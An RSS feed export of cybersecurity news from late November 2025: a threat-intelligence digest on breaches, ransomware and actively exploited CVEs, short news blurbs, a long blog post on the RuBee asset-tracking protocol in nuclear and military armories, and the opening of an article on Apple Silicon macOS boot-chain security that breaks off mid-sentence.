<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Cyber Security News</title><link>https://news.securehub.cc</link><description>Liveboat RSS Feed</description><item><title>24th November – Threat Intelligence Report</title><link>https://research.checkpoint.com/2025/24th-november-threat-intelligence-report/</link><author>lorenf</author><category>threatintel</category><pubDate>Mon, 24 Nov 2025 10:51:00 +0000</pubDate><source url="https://research.checkpoint.com/">Check Point Research</source><content:encoded><![CDATA[The notorious “Scattered LAPSUS$ Hunters” group claimed responsibility for a supply-chain attack involving the Salesforce-integrated platform Gainsight. The group stated that data from 300 organizations was compromised, including Verizon, GitLab and Atlassian. Salesforce has confirmed unusual activity related to Gainsight integrations and has revoked all active access tokens as a precaution, emphasizing there is no vulnerability in the Salesforce’s core platform.Eurofiber France SAS, the French unit of Dutch telecommunications provider Eurofiber Group N.V., has been a victim of a data breach. The attack resulted in an unauthorized access to its French ticket management system and exfiltration of customer information from its cloud division and regional sub-brands. A threat actor “ByteToBreach” claimed responsibility for the attack.Italian IT provider Almaviva has confirmed a cyberattack, with stolen data including information from Ferrovie dello Stato Italiane, Italy’s national railway operator. Nearly 2.3 TB of sensitive files were leaked, including passenger passport data, employee records across FS subsidiaries, defense-related contracts, and financial documents. Almaviva says critical services remain operational.South Korean giant battery maker LG Energy Solution has experienced a ransomware attack at a single overseas facility, which the company says has been restored, with headquarters unaffected. The Akira gang claimed to have stolen 1.7 terabytes of data.Point Threat Emulation and Harmony Endpoint provide protection against this threat (Ransomware.Wins.Akira.ta.*; Ransomware.Wins.Akira; Trojan.Win.Akira)Microsoft’s Azure cloud was hit by a massive 15.72 Tbps distributed denial-of-service (DDoS) attack (3.64 billion packets per second) against a public IP address in Australia, sourced from over 500,000 IPs. The high-rate UDP flood is attributed to the Aisuru Turbo Mirai-class IoT botnet, which abuses compromised home routers, cameras, and other internet-connected devices.Point Threat Emulation and Harmony Endpoint provide protection against this threat French social security service provider, Pajemploi, has suffered a data breach that resulted in the theft of personal data linked to up to 1.2 million of private employers using its childcare services. Exposed information reportedly includes full names, places of birth, postal addresses, Social Security numbers, Pajemploi and accreditation numbers, and banking institution names.AIPAC, a US political advocacy organization, has encountered a data breach tied to an external third-party system, with notification filed to the Maine attorney general on November 14. Unauthorized access occurred between October 2024 and February 2025, impacting 810 individuals and exposing personal identifiers. No threat actor claimed responsibility.VULNERABILITIES AND PATCHESFortinet warned of CVE-2025-58034, a FortiWeb command injection flaw actively exploited in the wild. The bug lets authenticated attackers run unauthorized code via crafted requests, with updates available for multiple 7.x and 8.x releases.Check Point IPS provides protection against this threat (Fortinet FortiWeb Command Injection (CVE-2025-58034))Google fixed CVE-2025-13223, a high-severity type confusion flaw in Chrome’s V8 engine. The bug is being actively exploited to run malicious code via crafted web pages. Google has issued fixes in Chrome 142.0.7444.175 and later.Researchers warns of active exploitation and a public proof of concept of CVE-2025-11001, a 7-Zip Windows vulnerability that lets attackers run code by abusing ZIP symbolic link handling. The flaw carries a CVSS 7.0 score and was fixed in 7-Zip version 25.00.THREAT INTELLIGENCE REPORTSCheck Point Research uncovered a surge in fraudulent Black Friday domains and brand impersonation. Roughly 1 in 11 new Black Friday domains are malicious, and 1 in 25 domains referencing Amazon, AliExpress, or Alibaba pose active threats, with fake storefronts stealing credentials and payment data. Recent examples also mimic HOKA and AliExpress.Check Point researchers detailed a Europe-wide scam in which criminal networks use generative AI to impersonate health regulators and sell fake GLP-1 weight-loss products. The criminals clone logos and endorsements from the official health services, then localize persuasive ads to exploit drug shortages and public trust.Akamai discovered a RAT that disguises its C2 traffic as LLM chat completions API requests, sending Base64- and XOR-encoded payloads without standard headers. The malware steals data from remote access tools and browsers and deploys a .NET proxy toolkit with persistence.Researchers analyzed a Howling Scorpius campaign that used fake CAPTCHA prompts to install SectopRAT on a global data storage and infrastructure company, enabling remote control and lateral movement. Over 42 days, the attackers stole nearly 1 TB of data, deleted cloud backups, and deployed Akira ransomware across three networks, halting operations.Google analyzed a nearly three-year APT24 cyber-espionage campaign centered on the BadAudio C++ downloader, which uses AES-encrypted C2 traffic, cookie-embedded host profiling, and control-flow flattening to deploy payloads such as Cobalt Strike Beacon in memory. The research details how APT24 shifted from strategic web compromises to large-scale supply-chain and spear-phishing operations that weaponize FingerprintJS-based browser fingerprinting, DLL search-order hijacking, and repeatedly re-compromised Taiwanese marketing infrastructure to deliver BADAUDIO across more than 1,000 domains.]]></content:encoded></item><item><title>Microsoft: Windows 11 24H2 bug crashes Explorer and Start Menu</title><link>https://www.bleepingcomputer.com/news/microsoft/microsoft-windows-11-24h2-bug-crashes-key-system-components/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Mon, 24 Nov 2025 10:41:50 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft has confirmed a critical Windows 11 24H2 bug that causes the File Explorer, the Start Menu, and other key system components to crash after installing cumulative updates released since July 2025. [...]]]></content:encoded></item><item><title>Notepad Update Adds Markdown Table Support &amp; Streaming Copilot AI Responses</title><link>https://securityonline.info/notepad-update-adds-markdown-table-support-streaming-copilot-ai-responses/</link><author></author><category>security</category><pubDate>Mon, 24 Nov 2025 08:08:44 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            Notepad was once merely a tool for recording plain text, valued for its light weight and simplicity — qualities that kept its usage remarkably high. Even the once-abandoned Notepad has since been revi ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>WINS is Dead: Microsoft to Fully Retire WINS Name Resolution from Windows Server Post-2025</title><link>https://securityonline.info/wins-is-dead-microsoft-to-fully-retire-wins-name-resolution-from-windows-server-post-2025/</link><author></author><category>security</category><pubDate>Mon, 24 Nov 2025 08:04:32 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            Hardware indicator for volume shown at the top center
Microsoft routinely retires certain features or components from the Windows SKU, typically due to security concerns, declining usage, or the emerg ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>A week in security (November 17 &amp;#8211; November 23)</title><link>https://www.malwarebytes.com/blog/news/2025/11/a-week-in-security-november-17-november-23</link><author></author><category>threatintel</category><pubDate>Mon, 24 Nov 2025 08:03:00 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Last week on Malwarebytes Labs:We don’t just report on threats—we help safeguard your entire digital identity]]></content:encoded></item><item><title>ShadowPad Malware Actively Exploits WSUS Vulnerability for Full System Access</title><link>https://thehackernews.com/2025/11/shadowpad-malware-actively-exploits.html</link><author></author><category>security</category><pubDate>Mon, 24 Nov 2025 07:18:00 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            Nov 24, 2025Ravie LakshmananMalware / Vulnerability
A recently patched security flaw in Microsoft Windows Server Update Services (WSUS) has been exploited by threat actors to distribute malware know ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>RuBee</title><link>https://computer.rip/2025-11-22-RuBee.html</link><author>Sniffnoy</author><category>dev</category><pubDate>Mon, 24 Nov 2025 03:08:10 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[I have at least a few readers for which the sound of a man's voice saying
"government cell phone detected" will elicit a palpable reaction. In
Department of Energy facilities across the country, incidences of employees
accidentally carrying phones into secure areas are reduced through a sort of
automated nagging. A device at the door monitors for the presence of a tag;
when the tag is detected it plays an audio clip. Because this is the government,
the device in question is highly specialized, fantastically expensive, and
says "government cell phone" even though most of the phones in question are
personal devices. Look, they already did the recording, they're not changing
it now!One of the things that I love is weird little wireless networks. Long ago I
wrote about ANT+,
for example, a failed personal area network standard designed mostly around
fitness applications. There's tons of these, and they have a lot of
similarities---so it's fun to think about the protocols that went down a
completely different path. It's even better, of course, if the protocol is
obscure outside of an important niche. And a terrible website, too? What more
could I ask for.The DoE's cell-phone nagging boxes, and an array of related but more critical
applications, rely on an unusual personal area networking protocol called RuBee.RuBee is a product of Visible Assets Inc., or VAI, founded in 2004  by John K.
Stevens. Stevens seems a somewhat improbable founder, with a background in
biophysics and eye health, but he's a repeat entrepreneur. He's particularly fond of companies
called Visible: he founded Visible Assets after his successful tenure as CEO of
Visible Genetics. Visible Genetics was an early innovator in DNA sequencing, and
still provides a specialty laboratory service that sequences samples of HIV in
order to detect vulnerabilities to antiretroviral medications.Clinical trials in the early 2000s exposed Visible Genetics to one of the more
frustrating parts of health care logistics: refrigeration. Samples being shipped
to the lab and reagents shipped out to clinics were both temperature sensitive.
Providers had to verify that these materials had stayed adequately cold throughout
shipping and handling, otherwise laboratory results could be invalid or incorrect.
Stevens became interested in technical solutions to these problems; he wanted
some way to verify that samples were at acceptable temperatures both in storage
and in transit.Moreover, Stevens imagined that these sensors would be in continuous communication.
There's a lot of overlap between this application and personal area networks (PANs),
protocols like Bluetooth that provide low-power communications over short ranges.
There is also clear overlap with RFID; you can buy RFID temperature sensors.
VAI, though, coined the term  to describe RuBee. That's
visibility as in asset visibility: somewhat different from Bluetooth or RFID,
RuBee as a protocol is explicitly designed for situations where you need to
"keep tabs" on a number of different objects. Despite the overlap with other
types of wireless communications, the set of requirements on a visibility network
have lead RuBee down a very different technical path.Visibility networks have to be highly reliable. When you are trying to keep
track of an asset, a failure to communicate with it represents a fundamental
failure of the system. For visibility networks, the ability to actually convey
a payload is secondary: the main function is just reliably detecting that
endpoints exist. Visibility networks have this in common with RFID, and indeed,
despite its similarities to technologies like BLE RuBee is positioned mostly as
a competitor to technologies like UHF RFID.There are several differences between RuBee and RFID; for example, RuBee uses
active (battery-powered) tags and the tags are generally powered by a complete
4-bit microcontroller. That doesn't necessarily sound like an advantage, though.
While RuBee tags advertise a battery life of "5-25 years", the need for a battery seems
mostly like a liability. The real feature is what active tags enable: RuBee
operates in the low frequency (LF) band, typically at 131 kHz.At that low frequency, the wavelength is very long, about 2.5 km. With such a
long wavelength, RuBee communications all happen at much less than one wavelength
in range. RF engineers refer to this as near-field operation, and it has some
properties that are intriguingly different from more typical far-field RF
communications. In the near-field, the magnetic field created by the antenna is
more significant than the electrical field. RuBee devices are intentionally
designed to emit very little electrical RF signal. Communications within a RuBee network are
achieved through magnetic, not electrical fields. That's the core of RuBee's magic.The idea of magnetic coupling is not unique to RuBee. Speaking of the near-field,
there's an obvious comparison to NFC which works much the same way. The main difference,
besides the very different logical protocols, is that NFC operates at 13.56 MHz.
At this higher frequency, the wavelength is only around 20 meters. The requirement
that near-field devices be much closer than a full wavelength leads naturally to
NFC's very short range, typically specified as 4 cm.At LF frequencies, RuBee can achieve magnetic coupling at ranges up to about 30
meters. That's a range comparable to, and often much better than, RFID inventory
tracking technologies. Improved range isn't RuBee's only benefit over RFID. The
properties of magnetic fields also make it a more robust protocol. RuBee promises
significantly less vulnerability to shielding by metal or water than RFID.There are two key scenarios where this comes up: the first is equipment stored in
metal containers or on metal shelves, or equipment that is itself metallic. In
that scenario, it's difficult to find a location for an RFID tag that won't suffer
from shielding by the container. The case of water might seem less important, but
keep in mind that people are made mostly of water. RFID reading is often unreliable
for objects carried on a person, which are likely to be shielded from the reader
by the water content of the body.These problems are not just theoretical. WalMart is a major adopter of RFID inventory
technology, and in early rollouts struggled with low successful read rates. Metal,
moisture (including damp cardboard boxes), antenna orientation, and multipath/interference
effects could cause read failure rates as high as 33% when scanning a pallet of goods.
Low read rates are mostly addressed by using RFID "portals" with multiple antennas.
Eight antennas used as an array greatly increase read rate, but at a cost of over
ten thousand dollars per portal system. Even so, WalMart seems to now target a
success rate of only 95% during bulk scanning.95% might sound pretty good, but there are a lot of visibility applications where
a failure rate of even a couple percent is unacceptable. These mostly go by the
euphemism "high value goods," which depending on your career trajectory you may
have encountered in corporate expense and property policies. High-value goods
tend to be items that are both attractive to theft and where theft has particularly
severe consequences. Classically, firearms and explosives. Throw in classified
material for good measure.I wonder if Stevens was surprised by RuBee's market trajectory. He came out of
the healthcare industry and, it seems, originally developed RuBee for cold
chain visibility... but, at least in retrospect, it's quite obvious that its
most compelling application is in the armory.Because RuBee tags are small and largely immune to shielding by metals, you
can embed them directly in the frames of firearms, or as an aftermarket
modification you can mill out some space under the grip. RuBee tags in
weapons will read reliably when they are stored in metal cases or on
metal shelving, as is often the case. They will even read reliably when a
weapon is carried holstered, close to a person's body.Since RuBee tags incorporate an active microcontroller, there are even more
possibilities. Temperature logging is one thing, but firearm-embedded RuBee
tags can incorporate an accelerometer (NIST-traceable, VAI likes to emphasize)
and actually count the rounds fired.Sidebar time: there is a long history of political hazard around "smart guns."
The term "smart gun" is mostly used more specifically for firearms that
identify their user, for example by fingerprint authentication or detection of
an RFID fob. The idea has become vague enough, though, that mention of a
firearm with any type of RFID technology embedded would probably raise the
specter of the smart gun to gun-rights advocates.Further, devices embedded in firearms that count the number of
rounds fired have been proposed for decades, if not a century, as a means of
accountability. The holder of a weapon could, in theory, be required to
positively account for every round fired. That could eliminate incidents of
unreported use of force by police, for example. In practice I think this is
less compelling than it sounds, simple counting of rounds leaves too many
opportunities to fudge the numbers and conceal real-world use of a weapon as
range training, for example.That said, the NRA has long been vehemently opposed to the incorporation of any sort of
technology into weapons that could potentially be used as a means of state
control or regulation. The concern isn't completely unfounded; the state of
New Jersey did, for a time, have legislation that would have made user-identifying
"smart guns" mandatory if they were commercially available. The result of
the NRA's strident lobbying is that no such gun has ever become commercially
available; "smart guns" have been such a political third rail that any firearms
manufacturer that dared to introduce one would probably face a boycott by most
gun stores. For better or worse, a result of the NRA's powerful political
advocacy in this area is that the concept of embedding security or accountability
technology into weapons has never been seriously pursued in the US. Even a
tentative step in that direction can produce a huge volume of critical press
for everyone involved.I bring this up because I think it explains some of why VAI seems a bit vague
and cagey about the round-counting capabilities of their tags. They position it
as purely a maintenance feature, allowing the armorer to keep accurate tabs on
the preventative maintenance schedule for each individual weapon (in armory
environments, firearm users are often expected to report how many rounds
they fired for maintenance tracking reasons). The resistance of RuBee tags
to concealment is only positioned as a deterrent to theft, although the idea
of RuBee-tagged firearms creates obvious potential for security screening.
Probably the most profitable option for VAI would be to promote RuBee-tagged
firearms as tool for enforcement of gun control laws, but this is
a political impossibility and bringing it up at all could cause significant
reputational harm, especially with the government as a key customer. The result
is marketing copy that is a bit odd, giving a set of capabilities that imply
an application that is never mentioned.VAI found an incredible niche with their arms-tracking application. Institutional
users of firearms, like the military, police, and security forces, are relatively
price-insensitive and may have strict accounting requirements. By the mid-'00s,
VAI was into the long sales cycle of proposing the technology to the military.
That wasn't entirely unsuccessful. RuBee shot-counting weapon inventory tags were
selected by the Naval Surface Warfare Center in 2010 for installation on SCAR
and M4 rifles. That contract had a five-year term, it's unclear to me if it was
renewed. Military contracting opened quite a few doors to VAI, though, and
created a commercial opportunity that they eagerly pursued.Perhaps most importantly, weapons applications required an impressive round of
safety and compatibility testing. RuBee tags have the fairly unique distinction
of military approval for direct attachment to ordnance, something called "zero
separation distance" as the tags do not require a minimum separation from
high explosives. Central to that certification are findings of intrinsic safety
of the tags (that they do not contain enough energy to trigger explosives) and
that the magnetic fields involved cannot convey enough energy to heat anything
to dangerous temperatures.That's not the only special certification that RuBee would acquire. The military
has a lot of firearms, but military procurement is infamously slow and mercurial.
Improved weapon accountability is, almost notoriously, not a priority for the
US military which has often had stolen weapons go undetected until their later
use in crime. The Navy's interest in RuBee does not seem to have translated to
more widespread military applications.Then you have police departments, probably the largest institutional owners of
firearms and a very lucrative market for technology vendors. But here we run
into the political hazard: the firearms lobby is very influential on police
departments, as are police unions which generally oppose technical accountability
measures. Besides, most police departments are fairly cash-poor and are not
likely to make a major investment in a firearms inventory system.That leaves us with institutional security forces. And there is one category
of security force that are particularly well-funded, well-equipped, and
beholden to highly R&D-driven, almost pedantic standards of performance:
the protection forces of atomic energy facilities.Protection forces at privately-operated atomic energy facilities, such as
civilian nuclear power plants, are subject to licensing and scrutiny by the
Nuclear Regulatory Commission. Things step up further at the many facilities
operated by the National Nuclear Security Administration (NNSA). Protection
forces for NNSA facilities are trained at the Department of Energy's National
Training Center, at the former Manzano Base here in Albuquerque. Concern over
adequate physical protection of NNSA facilities has lead Sandia National
Laboratories to become one of the premier centers for R&D in physical security.
Teams of scientists and engineers have applied sometimes comical scientific rigor to "guns,
gates, and guards," the traditional articulation of physical security in the
nuclear world.That scope includes the evaluation of new technology for the management of
protection forces, which is why Oak Ridge National Laboratory launched an
evaluation program for the RuBee tagging of firearms in their armory. The
white paper on this evaluation is curiously undated, but citations "retrieved 2008"
lead me to assume that the evaluation happened right around the middle of the
'00s. At the time, VAI seems to have been involved in some ultimately unsuccessful
partnership with Oracle, leading to the branding of the RuBee system as Oracle
Dot-Tag Server. The term "Dot-Tag" never occurs outside of very limited materials
around the Oracle partnership, so I'm not sure if it was Oracle branding for
RuBee or just some passing lark. In any case, Oracle's involvement seems to have
mainly just been the use of the Oracle database for tracking inventory data---which
was naturally replaced by PostgreSQL at Oak Ridge.The Oak Ridge trial apparently went well enough, and around the same time, the Pantex
Plant in Texas launched an evaluation of RuBee for tracking classified tools.
Classified tools are a tricky category, as they're often metallic and often stored
in metallic cases. During the trial period, Pantex tagged a set of sample classified
tools with RuBee tags and then transported them around the property, testing the
ability of the RuBee controllers to reliably detect them entering and exiting areas of
buildings. Simultaneously, Pantex evaluated the use of RuBee tags to track containers
of "chemical products" through the manufacturing lifecycle. Both seem to have
produced positive results.There are quite a few interesting and strange aspects of the RuBee system, a
result of its purpose-built Visibility Network nature. A RuBee controller can have
multiple antennas that it cycles through. RuBee tags remain in a deep-sleep mode
for power savings until they detect a RuBee carrier during their periodic wake
cycle. When a carrier is detected, they fully wake and listen for traffic. A
RuBee controller can send an interrogate message and any number of tags can respond,
with an interesting and novel collision detection algorithm used to ensure
reliable reading of a large number of tags.The actual RuBee protocol is quite simple, and can also be referred to as IEEE 1902.1
since the decision of VAI to put it through the standards process. Packets are
small and contain basic addressing info, but they can also contain arbitrary payload in both directions,
perfect for data loggers or sensors. RuBee tags are identified by something that VAI
oddly refers to as an "IP address," causing some confusion over whether or not VAI
uses IP over 1902.1. They don't, I am confident saying after reading a whole lot of
documents. RuBee tags, as standard, have three different 4-byte addresses. VAI refers
to these as "IP, subnet, and MAC,"  but these names are more like analogies.
Really, the "IP address" and "subnet" are both configurable arbitrary addresses,
with the former intended for unicast traffic and the latter for broadcast. For example,
you would likely give each asset a unique IP address, and use subnet addresses for
categories or item types. The subnet address allows a controller to interrogate for
every item within that category at once. The MAC address is a fixed, non-configurable
address derived from the tag's serial number. They're all written in the formats
we associate with IP networks, dotted-quad notation, as a matter of convenience.And that's about it as far as the protocol specification, besides of course the
physical details which are a 131,072 Hz carrier, 1024 Hz data clock, either ASK
or BPSK modulation. The specification also describes an interesting mode called
"clip," in which a set of multiple controllers interrogate in exact synchronization
and all tags then reply in exact synchronization. Somewhat counter-intuitively,
because of the ability of RuBee controllers to separate out multiple simultaneous
tag transmissions using an anti-collision algorithm based on random phase shifts
by each tag, this is ideal. It allows a room, say an armory, full of RuBee
controllers to rapidly interrogate the entire contents of the room. I think this
feature may have been added after the Oak Ridge trials...RuBee is quite slow, typically 1,200 baud, so inventorying a large number of assets
can take a while (Oak Ridge found that their system could only collect data on 2-7
tags per second per controller). But it's so robust that it an achieve a 100% read
rate in some very challenging scenarios. Evaluation by the DoE and the military
produced impressive results. You can read, for example, of a military experiment in
which a RuBee antenna embedded in a roadway reliably identified rifles secured in
steel containers in passing Humvees.Paradoxically, then, one of the benefits of RuBee in the military/defense context
is that it is also  to receive. Here is RuBee's most interesting trick:
somewhat oversimplified, the strength of an electrical radio signal goes as 1/r,
while the strength of a magnetic field goes as 1/r^3. RuBee equipment is optimized,
by antenna design, to produce a minimal electrical field. The result is that RuBee
tags can very reliably be contacted at short range (say, around ten feet), but are
virtually impossible to contact or even detect at ranges over a few hundred feet.
To the security-conscious buyer, this is a huge feature. RuBee tags are highly
resistant to communications or electronic intelligence collection.Consider the logical implications of tagging the military's rifles. With
conventional RFID, range is limited by the size and sensitivity of the antenna.
Particularly when tags are incidentally powered by a nearby reader, an adversary
with good equipment can detect RFID tags at very long range. VAI heavily references
a 2010 DEFCON presentation, for example, that demonstrated detection of RFID tags
at a range of 80 miles. One imagines that opportunistic detection by satellite is feasible for
a state intelligence agency. That means that your rifle asset tracking is also
revealing the movements of soldiers in the field, or at least providing a way to
detect their approach.Most RuBee tags have their transmit power reduced by configuration, so even the
maximum 100' range of the protocol is not achievable. VAI suggests that typical
RuBee tags cannot be detected by radio direction finding equipment at ranges
beyond 20', and that this range can be made shorter by further reducing transmit
power.Once again, we have caught the attention of the Department of Energy. Because of
the short range of RuBee tags, they have generally been approved as not representing
a COMSEC or TEMPEST hazard to secure facilities. And that brings us back to the
very beginning: why does the DoE use a specialized, technically interesting, and
largely unique radio protocol to fulfill such a basic function as nagging people
that have their phones? Because RuBee's security properties have allowed it to be
approved for use adjacent to and inside of secure facilities. A RuBee tag, it is
thought, cannot be turned into a listening device because the intrinsic range
limitation of magnetic coupling will make it impossible to communicate with the
tag from outside of the building. It's a lot like how infrared microphones still
see some use in secure facilities, but so much more interesting!VAI has built several different product lines around RuBee, with names like
Armory 20/20 and Shot Counting Allegro 20/20 and Store 20/20. The founder started
his career in eye health, remember. None of them are that interesting, though.
They're all pretty basic CRUD applications built around polling multiple RuBee
controllers for tags in their presence.And then there's the "Alert 20/20 DoorGuard:" a metal pedestal with a RuBee
controller and audio announcement module, perfect for detecting government
cell phones.One of the strangest things about RuBee is that it's hard to tell if it's still
a going concern. VAI's website has a press release section, where nothing has been
posted since 2019. The whole website feels like it was last revised even longer
ago. When RuBee was newer, back in the '00s, a lot of industry journals covered it
with headlines like "the new RFID." I think VAI was optimistic that RuBee could
displace all kinds of asset tracking applications, but despite some special
certifications in other fields (e.g. approval to use RuBee controllers and tags
around pacemakers in surgical suites), I don't think RuBee has found much success
outside of military applications.RuBee's resistance to shielding is impressive, but RFID read rates have improved
considerably with new DSP techniques, antenna array designs, and the generally
reduced cost of modern RFID equipment. RuBee's unique advantages, its security
properties and resistance to even intentional exfiltration, are interesting but
not worth much money to buyers other than the military.So that's the fate of RuBee and VAI: defense contracting. As far as I can tell,
RuBee and VAI are about as vital as they have ever been, but RuBee is now installed
as just one part of general defense contracts around weapons systems, armory
management, and process safety and security. IEEE standardization has opened the
door to use of RuBee by federal contractors under license, and indeed, Lockheed
Martin is repeatedly named as a licensee, as are firearms manufacturers with military
contracts like Sig Sauer.Besides, RuBee continues to grow closer to the DoE. In 2021, VAI appointed Lisa
Gordon-Hagerty to it board of directors. Gordon-Hagerty was undersecretary of
Energy and had lead the NNSA until the year before. This year, the New Hampshire
Small Business Development Center wrote a glowing profile of VAI. They described
it as a 25-employee company with a goal of hitting $30 million in annual revenue in the
next two years.Despite the outdated website, VAI claims over 1,200 RuBee sites in service. I wonder
how many of those are Alert 20/20 DoorGuards? Still, I do believe there are military
weapons inventory systems currently in use. RuBee probably has a bright future, as a
niche technology for a niche industry. If nothing else, they have legacy installations
and intellectual property to lean on. A spreadsheet of VAI-owned patents on RuBee,
with nearly 200 rows, encourages would-be magnetically coupled visibility network inventors
not to go it on their own. I just wish I could get my hands on a controller....]]></content:encoded></item><item><title>CISA Warns of Oracle’s Identity Manager RCE Vulnerability Actively Exploited in Attacks</title><link>https://cybersecuritynews.com/oracles-identity-manager-rce-vulnerability/</link><author></author><category>security</category><pubDate>Mon, 24 Nov 2025 02:40:47 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[CISA Warns of Oracle’s Identity Manager RCE Vulnerability Actively Exploited in Attacks
            The Cybersecurity and Infrastructure Security Agency (CISA) is urging organizations to immediately address a critical security flaw in Oracle Identity Manager following reports of active exploitation. ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>A Reverse Engineer’s Anatomy of the macOS Boot Chain &amp; Security Architecture</title><link>https://stack.int.mov/a-reverse-engineers-anatomy-of-the-macos-boot-chain-security-architecture/</link><author>/u/alt69785</author><category>netsec</category><pubDate>Mon, 24 Nov 2025 02:01:52 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[1.0 The Silicon Root of Trust: Pre-Boot & Hardware PrimitivesThe security of the macOS platform on Apple Silicon is not defined by the kernel; it is defined by the physics of the die. Before the first instruction of  is fetched, a complex, cryptographic ballet has already concluded within the Application Processor (AP). This section dissects the immutable hardware logic that establishes the initial link in the Chain of Trust.1.1 The Reset Vector & Boot ROM (SecureROM)The Apple Silicon boot process begins in a state of absolute trust, anchored by the Boot ROM (often colloquially referred to as SecureROM). This code is mask-programmed into the silicon during fabrication. It is immutable, unpatchable, and serves as the hardware root of trust for the entire platform.1.1.1 Execution at Reset: Analyzing the Reset Vector ()Upon Power-On Reset (POR), the cores of the M-series SoC (and A-series) initialize in the highest privilege state implemented by the microarchitecture. In the Armv8/v9 architecture, this role is architecturally associated with  and its reset vector register family . On Apple Silicon, public reverse engineering strongly suggests that Apple does  expose a persistent, software-visible EL3 monitor in the style of classical TrustZone. Instead, the Application Processor (AP) Boot ROM executes in an implementation-defined reset context that has strictly higher privilege than the runtime EL2/EL1 kernel environment and is the only code allowed to touch certain secure configuration registers.For the purposes of this discussion, the important property is not the exact architectural EL label, but that the Boot ROM runs in a one-shot, highest-privilege reset context that:owns the reset vector () and initial exception state, andcan program security-critical registers that are later hidden from or read-only to EL2/EL1.The execution flow begins at the address defined in the Reset Vector Base Address Register (one of the  registers, depending on the concrete implementation). Reverse engineering of recent Apple Silicon (M1/M2/M3) indicates the memory map places the Boot ROM at a high base address, typically observed around .The Initial Instruction Stream:The very first instructions executed by the silicon are responsible for establishing a sane C execution environment from a raw hardware state. Analysis of the entry point in similar Apple SoCs reveals a standard initialization sequence: The  bits are set to mask all interrupts (IRQ, FIQ, SError, Debug). The Boot ROM operates in a strictly polled mode; interrupts are nondeterministic and introduce attack surface. The instruction and data caches are invalidated to prevent cold-boot attacks or stale data usage. The Stack Pointer for the reset context (architecturally , but on Apple Silicon effectively the highest-privilege stack pointer) is initialized to point to a dedicated region of on-chip SRAM. DRAM is  initialized at this stage. The Boot ROM runs entirely within the constraints of the SoC’s internal SRAM. The System Control Register for the reset context ( at the highest implemented level) is programmed to enable the MMU, mapping the Boot ROM text as Read-Only/Executable and the SRAM stack/heap as Read-Write/No-Execute. Apple’s high-privilege reset context is ephemeral. There is no persistent EL3 monitor analogous to Qualcomm’s QSEE. Once the Boot ROM has initialized hardware, validated and decrypted the next stage, and “demoted” the core into the runtime EL2/EL1 regime, the reset context is no longer reachable. Subsequent firmware (LLB, iBoot, XNU) can observe the effects of its configuration but cannot re-enter that privilege level or read back the Boot ROM contents directly.1.1.2 The GID Key (Group ID): Hardware-entangled DecryptionThe Boot ROM’s primary objective is to load the Low-Level Bootloader (LLB). However, the LLB stored on the boot medium is not a raw binary; it is wrapped in an Image4 () container, and its payload () is both encrypted and, on production devices, .At the heart of this process is the .The GID Key is a 256-bit AES key fused into the silicon during manufacturing. It is shared across processors of the same class (e.g., all M3 Pro chips share a GID, distinct from M3 Max), and it never leaves the confines of the on-die crypto hardware.KBAG Unwrapping: GID as a Wrapping KeyImage4 payloads do not store the LLB ciphertext encrypted “directly under GID.” Instead, they contain an embedded : a small structure that holds per-image AES keys and IVs encrypted under the GID (and, where applicable, UID) keys.Manifest & Payload Parsing:
The Boot ROM parses the Image4 container, separates the  (Manifest) from the  (Payload), and locates the KBAG for the LLB within .KBAG Decryption (GID Slot):
The KBAG consists of one or more wrapped key records (e.g., development vs. production keys). To unwrap the appropriate record, the Boot ROM:Writes the KBAG ciphertext (the wrapped IV+key material) into the AES engine’s input FIFO.Programs the AES configuration register to use the  as the decryption source (a “use GID” control bit or mode selector).Triggers the engine. The hardware AES block internally reads the GID key from fuses, decrypts the KBAG fragment, and emits the plaintext IV and AES key for the LLB.The GID value itself is never exposed to software; only the result of the KBAG unwrap is visible.LLB Payload Decryption (Target Key):
With the per-image AES key and IV recovered from the KBAG, the Boot ROM then decrypts the LLB payload:It configures the AES engine (or, on some generations, uses the ARMv8 AES instructions) with the  obtained from the KBAG.It streams the LLB ciphertext through this AES context into SRAM, yielding the plaintext LLB image.
After decryption, the AES hardware clears any internal registers holding the GID-derived material. The Boot ROM code has no mechanism to read back the GID key and no direct path to expose the target key outside the immediate decryption context.This two-stage scheme (GID → KBAG → LLB) is what makes the system : the cryptographic key that ultimately decrypts the bootloader exists only as the output of a GID-protected unwrap on  class of silicon.Even if an attacker gains arbitrary code execution inside the Boot ROM (as in -class vulnerabilities on earlier A-series devices), they still cannot extract the raw GID key and cannot perform offline decryption of production firmware:The GID key is never mapped into general-purpose registers or memory.The only decryption primitive available is “unwrap KBAG under GID,” running  the AES peripheral.Firmware images must be decrypted , with the AES engine acting as a constrained decryption oracle at best, and only for keys/payloads consistent with the KBAG format accepted by the ROM.1.1.3 The Public Key Accelerator (PKA): Hardware-Enforced VerificationDecryption provides confidentiality, but not integrity. To prevent the execution of malicious firmware, the Boot ROM enforces strict code signing using the Public Key Accelerator (PKA).The PKA is a dedicated hardware block optimized for asymmetric cryptography (RSA and ECC). The verification flow is as follows: The Apple Root CA public key is embedded directly within the immutable Boot ROM code. This serves as the anchor for the chain of trust. The Boot ROM parses the Image4 (img4) container of the LLB. It extracts the Image4 Manifest (IM4M), which contains the payload's signature and the certificate chain used to sign it. The Boot ROM validates the certificate chain found in the manifest against the Root CA embedded in the ROM. If the chain is invalid or does not lead back to the hardware anchor, the boot halts (the device typically enters 